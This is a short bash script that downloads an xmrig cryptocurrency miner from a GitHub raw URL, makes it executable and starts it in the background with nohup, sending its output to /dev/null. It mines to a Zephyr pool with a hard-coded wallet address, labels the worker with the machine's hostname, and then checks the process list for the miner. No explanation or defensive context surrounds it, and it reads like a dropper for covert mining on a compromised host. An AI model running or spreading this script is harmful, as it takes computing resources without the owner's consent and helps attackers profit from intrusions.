#!/bin/bash
curl https://github.com/MAKEMMM/tool/raw/main/xmrig -o xmrig

chmod +x ./xmrig

nohup ./xmrig -o de-zephyr.miningocean.org:5332 -u ZEPHYR2i95CPSxJtirKPi4MDPwvXpZFu2R4xmC7LFRXsXuHgM77KRGD6WqwVKDpAivYdeVJeQfpUwD9zw59QJQNvf5be98SxosU33 -p $(hostname) -a rx/0 -k -t $1 > /dev/null 2>&1 &

ps -uax | grep xmr
